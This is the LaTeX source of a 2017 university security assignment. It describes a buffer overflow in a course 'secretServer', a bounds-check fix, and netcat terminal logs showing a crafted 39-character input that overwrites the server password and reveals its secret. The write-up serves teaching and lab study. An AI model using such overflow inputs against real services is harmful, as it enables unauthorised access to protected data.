\documentclass[11pt]{article}
\usepackage{array, url, kantlipsum, listings, xcolor}
\usepackage[margin=1in]{geometry}

\lstdefinestyle{terminal}
{
    backgroundcolor=\color{white},
    basicstyle=\footnotesize\color{black}\ttfamily,
    frame=tb,
    numbers=left
}
\makeatletter
\long\def\@makecaption#1#2{%
	\vskip\abovecaptionskip
		\bfseries #1: #2\par
	\vskip\belowcaptionskip}%
\makeatother

\title{Assignment 1 \\CPSC 526 Fall 2017 \\ October 1, 2017}
\author{
\begin{tabular}{c c}
Mason Lieu & Shane Sims\tabularnewline
ID: 10110089 & ID: 00300601\tabularnewline
Tutorial 04 & Tutorial 04 \tabularnewline
\url{mlieu@ucalgary.ca} & \url{shane.sims@ucalgary.ca}
\end{tabular}}
\date{}

\begin{document}
\maketitle

\section*{Task 1 - Exploit the vulnerability}
The vulnerability can be found in the readLineFromFd function where this function reads from the socket into the provided buffer. Since this function does not check the size of the input, the vulnerability can be exploited by a client by providing an input greater than the instantiated buffer size to overflow the buffer contents into the memory space of the password. This overwrites the server's password with the overflowed bytes, effectively changing the password. The next time the client connects to the server, the client can input the overflowed bytes (i.e. the new password), forcing the server to reveal its secret.

\section*{Task 2 - Fix the vulnerability}
The vulnerability can be removed from the readLineFromFd function by reading from the socket a number of bytes equal to the size of the buffer. This ensures that a buffer overflow does not take place and the server's data is protected from this exploit.

\section*{How to compile and run our patch}
Our patched server is compiled and run the same as the original server.

\section*{Sample exploit of the original server}
\begin{lstlisting}[style=terminal, title={Server side}]
Masons-MacBook-Pro:a1 MasonL$ ./secretServer 1234 pass 'My favourite number is 42.'
Waiting for a new connection...
Talking to someone.
Someone used an incorrect password.
Waiting for a new connection...
Talking to someone.
Someone used an incorrect password.
Waiting for a new connection...
Talking to someone.
Someone used the correct password.
Waiting for a new connection...
\end{lstlisting}
\begin{lstlisting}[style=terminal, title={Client side}]
Masons-MacBook-Pro:a1 MasonL$ nc localhost 1234
Secret Server 1.0
NEWPASS
I am not talking to you, bye!
Masons-MacBook-Pro:a1 MasonL$ nc localhost 1234
Secret Server 1.0
11111111112222222222333333333344NEWPASS
I am not talking to you, bye!
Masons-MacBook-Pro:a1 MasonL$ nc localhost 1234
Secret Server 1.0
NEWPASS
The secret is: My favourite number is 42.
\end{lstlisting}

\subsection*{Server side explanation}
\begin{itemize}
\item Line 1 shows the initialization of the server with the password = 'pass' and the secret. The rest of the lines are the server's response to the client.
\end{itemize}

\subsection*{Client side explanation}
\begin{itemize}
\item Lines 1-4 is a test with the password = 'NEWPASS' chosen by the attacker; since the attacker does not know the real password this does not reveal the secret. 
\item Lines 5-8 show the attacker using a 39 character string to overflow the buffer using the string '11111111112222222222333333333344NEWPASS'. The substring 'NEWPASS' are bytes 32-38 and these bytes are overwritten into the memory space of the server's password.
\item Lines 9-12 show the attacker using the same password = 'NEWPASS', however since the buffer overflow caused the server's password to be overwritten with bytes of the attacker's choosing, this forces the server to reveal the password to the attacker.
\end{itemize}


\end{document}